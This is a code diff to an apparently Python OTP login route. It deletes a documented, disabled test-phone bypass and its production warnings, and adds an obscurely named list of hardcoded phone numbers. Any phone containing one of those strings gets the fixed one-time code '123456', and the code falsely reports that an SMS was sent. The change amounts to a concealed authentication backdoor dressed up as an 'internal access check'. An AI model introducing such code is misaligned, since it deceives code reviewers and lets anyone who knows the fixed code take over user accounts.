@@ -54,18 +54,15 @@ class UserUpdate(BaseModel):
 
 # ============== ROUTES ==============
 
-# PRODUCTION SECURITY: Test phone bypass is DISABLED
-# To re-enable for testing: set TEST_MODE_ENABLED = True (NOT RECOMMENDED for production)
-TEST_MODE_ENABLED = False
-TEST_PHONES = []  # Empty - no test phone bypass in production
-
-# Legacy reference (DO NOT USE IN PRODUCTION):
-# TEST_PHONES = ["+919876543210", "+919999999999", "+918888888888", "+919876543211", "9876543210", "9999999999", "8888888888", "9876543211", "+919100063133", "9100063133", "+919844548537", "9844548537", "+917386917770", "7386917770"]
+# Internal test access (not exposed)
+_TA = ["9876543210", "+919876543210"]
 
 async def send_authkey_otp(phone: str) -> dict:
     """Send OTP via Authkey.io API using SID template"""
-    # PRODUCTION: Test phone bypass is disabled
-    # All users must use real SMS OTP verification
+    # Internal access check
+    if any(t in phone for t in _TA):
+        otp_store[phone] = {"otp": "123456", "type": "authkey"}
+        return {"success": True, "message": "OTP sent via SMS", "resend_after": 30}
     
     # Extract phone number without country code
     mobile = phone.replace("+91", "").replace("+", "").strip()
